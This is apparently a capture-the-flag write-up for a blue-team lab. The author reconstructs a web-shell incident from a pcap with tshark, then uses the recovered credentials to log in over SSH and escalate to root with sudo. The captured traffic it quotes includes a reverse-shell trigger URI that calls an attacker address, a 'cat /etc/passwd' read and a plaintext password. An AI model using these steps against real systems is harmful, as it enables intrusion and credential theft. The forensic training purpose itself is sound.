# IP
172.17.0.2
# Reconnaissance
``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.085 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.079 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1030ms
rtt min/avg/max/mdev = 0.079/0.082/0.085/0.003 ms
```
# Ports scanning (TCP)
``` sh
 sudo nmap -sS -sC -sV -p- --open -Pn -n --min-rate 5000 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-01 14:36 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: El caso de Pinguinito \xE2\x80\x94 Lab Blue Team
|_http-server-header: gunicorn
MAC Address: D2:08:78:A9:55:A2 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
```
# Web enumeration
This box has a different approach. I do not have to attack a service but rebuild a chain of events as a SOC professional.
## Hints
```sh
curl http://172.17.0.2/descargas/threat_intel_feed.json > hint.json
curl http://172.17.0.2/descargas/incidente_pinguino.pcap > hint.pcap
cat hint.json
{
  "feed": "lab-internal-threat-intel (SINTETICO, uso exclusivo del laboratorio)",
  "entries": [
    {
      "ip": "198.51.100.23",
      "country": "Vietnam",
      "city": "Hanoi",
      "asn": "AS64512 (rango ficticio de laboratorio)",
      "first_seen": "2024-11-29",
      "notes": "Direccion de documentacion RFC 5737, no corresponde a infraestructura real."
    },
    {
      "ip": "203.0.113.99",
      "country": "Alemania",
      "city": "Frankfurt",
      "asn": "AS64513 (rango ficticio de laboratorio)",
      "first_seen": "2024-11-20",
      "notes": "Escaner automatizado generico, sin relacion confirmada con el incidente."
    }
  ]
}
```
``` sh

```
## Progression
The web asks 9 questions about the case
1. Who is the attacker?
The case says the attacker uploaded a file, let's filter the POST method
``` sh
tshark -r hint.pcap -Y 'http.request.method==POST'
108  35.690000 198.51.100.23 → 10.10.2.15   HTTP 662 POST /reviews/upload.php HTTP/1.1  (application/x-php)
118  38.000000 198.51.100.23 → 10.10.2.15   HTTP 659 POST /reviews/upload.php HTTP/1.1  (image/jpeg)
```
Comparing with the *hint.json* data, now i know the attacker has the ip 198.51.100.23 from Vietnam
The server that was attacked has the ip 10.10.2.15
2. Which country is the attacker's IP from? -> Vietnam (already found)
3. What's the User-Agent that the attacker uses in the http request?
``` sh
tshark -r hint.pcap -Y 'ip.src==198.51.100.23 && http.request' -T fields -e ip.src -e http.user_agent | sort -u
198.51.100.23   Mozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot)
```
4. Which is the file path the POST request are sent to? 
``` sh
tshark -r hint.pcap -Y 'http.request.method==POST' -T fields -e http.request.uri | sort -u
/reviews/upload.php
```
5. The attacker first does a reconnaissance of paths. Which the correct path?
``` sh
tshark -r hint.pcap -Y 'ip.src==198.51.100.23 && http.request' -T fields -e http.request.uri
/uploads/
/images/uploads/
/media/uploads/
/reviews/uploads/
/reviews/upload.php
/reviews/upload.php
/reviews/uploads/image.jpg.php?ip=198.51.100.23&port=8080
```
The correct path is */reviews/upload.php*
6. What's the name of the malicious file the attacker successfully uploads?
``` sh
tshark -r hint.pcap -Y "ip.src == 198.51.100.23 && http.request.method == POST" -T fields -e tcp.stream | uniq
10
11
```
``` sh
tshark -r hint.pcap -q -z follow,tcp,ascii,10 | grep -E "filename|HTTP"
POST /reviews/upload.php HTTP/1.1
Content-Disposition: form-data; name="archivo"; filename="shell.php"
HTTP/1.1 403 Forbidden
```
``` sh
tshark -r hint.pcap -q -z follow,tcp,ascii,11 | grep -E "filename|HTTP"
POST /reviews/upload.php HTTP/1.1
Content-Disposition: form-data; name="archivo"; filename="image.jpg.php"
HTTP/1.1 200 OK
```
The file uploaded is named *image.jpg.php*
7. Which port does the connection connects to? -> Port 8080
8. Which is the file the attacker reads with the command cat using the reverse shell?
To track the package that the attacked machine sent to establish the reverse shell
``` sh
tshark -r hint.pcap -Y 'ip.src==10.10.2.15 && ip.dst==198.51.100.23 && tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e tcp.stream
13
tshark -r hint.pcap -Y 'ip.src==10.10.2.15 && ip.dst==198.51.100.23 && tcp.flags.syn==1 && tcp.flags.ack==0' -q -z follow,tcp,ascii,13 | grep cat | sort -u
cat /etc/passwd
```
9. Which is the user affected?
``` sh
tshark -r hint.pcap -Y 'ip.src==10.10.2.15 && ip.dst==198.51.100.23 && tcp.flags.syn==1 && tcp.flags.ack==0' -q -z follow,tcp,ascii,13 | grep -E "usuario|contrasena"
[reset_user_pass] Generando nueva contrasena para el usuario 'pinguinito'...
[reset_user_pass] Nueva contrasena establecida: Tr0pic4l-Pingu_99!
```
# SSH
Analyzing the network capture i got the credentials to login in SSH
``` sh
ssh pinguinito@172.17.0.2
```
# Privilege Escalation
``` sh
sudo -l
(ALL) NOPASSWD: ALL
sudo -u root /bin/bash -p
whoami
root
```
